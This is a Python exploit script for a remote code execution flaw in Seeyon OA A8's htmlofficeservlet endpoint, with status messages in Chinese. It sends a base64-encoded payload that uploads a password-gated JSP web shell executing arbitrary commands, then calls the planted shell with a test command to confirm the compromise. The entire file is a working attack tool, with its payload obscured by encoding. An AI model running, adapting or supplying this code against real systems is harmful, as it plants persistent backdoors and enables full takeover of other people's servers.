import requests
import re
from bs4 import BeautifulSoup
import logging
import base64

uia=''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        gf2 = requests.get(url + 'seeyon/htmlofficeservlet', cookies=s_cookie, headers=header, proxies=proxies,verify=False)
        if 'htmoffice' in gf2.text:
            payload = "REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkTjFsaU40S1h3aVZHemZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpIHtTdHJpbmdCdWlsZGVyIGxpbmUgPSBuZXcgU3RyaW5nQnVpbGRlcigpO3RyeSB7UHJvY2VzcyBwcm8gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO0J1ZmZlcmVkUmVhZGVyIGJ1ZiA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocHJvLmdldElucHV0U3RyZWFtKCkpKTtTdHJpbmcgdGVtcCA9IG51bGw7d2hpbGUgKCh0ZW1wID0gYnVmLnJlYWRMaW5lKCkpICE9IG51bGwpIHtsaW5lLmFwcGVuZCh0ZW1wKyJcbiIpO31idWYuY2xvc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge2xpbmUuYXBwZW5kKGUuZ2V0TWVzc2FnZSgpKTt9cmV0dXJuIGxpbmUudG9TdHJpbmcoKTt9ICU+PCVpZigiYXNhc2QzMzQ0NSIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkmJiEiIi5lcXVhbHMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSl7b3V0LnByaW50bG4oIjxwcmU+IitleGN1dGVDbWQocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSArICI8L3ByZT4iKTt9ZWxzZXtvdXQucHJpbnRsbigiOi0pIik7fSU+NmU0ZjA0NWQ0Yjg1MDZiZjQ5MmFkYTdlMzM5MGQ3Y2U="
            data = base64.b64decode(payload)
            logging.captureWarnings(True)
            requests.post(url, data=data, cookies=s_cookie, headers=header, proxies=proxies, verify=False)
            gf1 = requests.get(url + "seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd+/c+echo+666", cookies=s_cookie,proxies=proxies, verify=False)
            if '666' in gf1.text:
                uia = '[+]漏洞存在\n%sseeyon/test123456.jsp?pwd=asasd3344&cmd=cmd+/c+echo+666' % (url)
            else:
                uia = "[-]漏洞不存在"
        else:
            uia = "[-]漏洞不存在"
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
def yt1():
    global uia
    return '--------------------------------------------------\n[ 致远OA A8 htmlofficeservlet RCE漏洞 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)